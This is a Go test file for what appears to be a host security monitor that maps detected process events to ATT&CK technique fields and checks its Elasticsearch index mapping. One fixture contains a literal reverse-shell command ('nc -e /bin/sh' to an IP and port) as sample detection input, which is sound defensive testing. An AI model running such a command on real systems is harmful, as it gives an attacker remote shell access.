package main

import (
	"encoding/json"
	"testing"
)

func TestAttackDocWritesMappedFields(t *testing.T) {
	event := Event{EventType: EventTypeExecve, ImagePath: "/usr/bin/nc", CommandLine: "nc -e /bin/sh 10.0.0.5 4444"}
	applyAttackTaxonomy(&event, "reverse_shell", 0.83, CategorySourceLaya)

	doc := attackDoc(event)

	want := map[string]any{
		"attack.category":       "reverse_shell",
		"attack.technique":      "T1059.004",
		"attack.technique_name": "Command and Scripting Interpreter: Unix Shell",
		"attack.tactic":         TacticExecution,
		"attack.source":         CategorySourceLaya,
		"attack.confidence":     0.83,
	}

	for field, expected := range want {
		got, ok := doc[field]
		if !ok {
			t.Errorf("doc is missing %s", field)
			continue
		}
		if got != expected {
			t.Errorf("doc[%s] = %v, want %v", field, got, expected)
		}
	}

	if len(doc) != len(want) {
		t.Errorf("doc has %d fields, want %d: %v", len(doc), len(want), doc)
	}
}

func TestAttackDocOmitsUnsetFields(t *testing.T) {
	event := Event{EventType: EventTypeOpen, FilePath: "/var/log/syslog"}
	applyAttackTaxonomy(&event, CategoryFileAccess, 0, CategorySourceRules)

	doc := attackDoc(event)

	if _, present := doc["attack.technique"]; present {
		t.Error("doc should not write an empty technique")
	}
	if _, present := doc["attack.technique_name"]; present {
		t.Error("doc should not write an empty technique name")
	}
	if _, present := doc["attack.tactic"]; present {
		t.Error("doc should not write an empty tactic")
	}
	if _, present := doc["attack.confidence"]; present {
		t.Error("doc should not write a zero confidence")
	}
	if doc["attack.category"] != CategoryFileAccess {
		t.Errorf("doc[attack.category] = %v, want %q", doc["attack.category"], CategoryFileAccess)
	}
	if doc["attack.source"] != CategorySourceRules {
		t.Errorf("doc[attack.source] = %v, want %q", doc["attack.source"], CategorySourceRules)
	}
}

func TestAttackDocEmptyForUncategorizedEvent(t *testing.T) {
	if doc := attackDoc(Event{EventType: EventTypeExecve}); len(doc) != 0 {
		t.Errorf("doc = %v, want empty", doc)
	}
}

// Every field the code writes must be declared in the index mapping, otherwise
// Elasticsearch dynamically maps it as text and the aggregations break.
func TestAttackDocFieldsAreMapped(t *testing.T) {
	es := &ESClient{index: EventsIndex, vectors: VectorDim}
	mapped := es.attackProperties()

	event := Event{EventType: EventTypeExecve}
	applyAttackTaxonomy(&event, "curl_pipe", 0.9, CategorySourceRules)
	applyAttackTaxonomy(&event, CategoryBenign, 0.9, CategorySourceLaya)

	for _, filled := range []Event{event, {EventType: EventTypeConnect}} {
		for field := range attackDoc(filled) {
			if _, ok := mapped[field]; !ok {
				t.Errorf("field %s is written to the index but not in the mapping", field)
			}
		}
	}

	if len(mapped) != 6 {
		t.Errorf("mapping declares %d attack fields, want 6: %v", len(mapped), mapped)
	}
}

func TestBuildMappingIncludesAttackProperties(t *testing.T) {
	es := &ESClient{index: EventsIndex, vectors: VectorDim}

	var mapping struct {
		Mappings struct {
			Properties map[string]any `json:"properties"`
		} `json:"mappings"`
	}
	if err := json.Unmarshal(es.buildMapping(), &mapping); err != nil {
		t.Fatalf("buildMapping produced invalid JSON: %v", err)
	}

	for _, field := range []string{
		"attack.category", "attack.technique", "attack.technique_name",
		"attack.tactic", "attack.source", "attack.confidence",
	} {
		if _, ok := mapping.Mappings.Properties[field]; !ok {
			t.Errorf("buildMapping is missing %s", field)
		}
	}

	if _, ok := mapping.Mappings.Properties["embedding"]; !ok {
		t.Error("buildMapping lost the embedding property")
	}
	if _, ok := mapping.Mappings.Properties["command.line"]; !ok {
		t.Error("buildMapping lost the command.line property")
	}
}
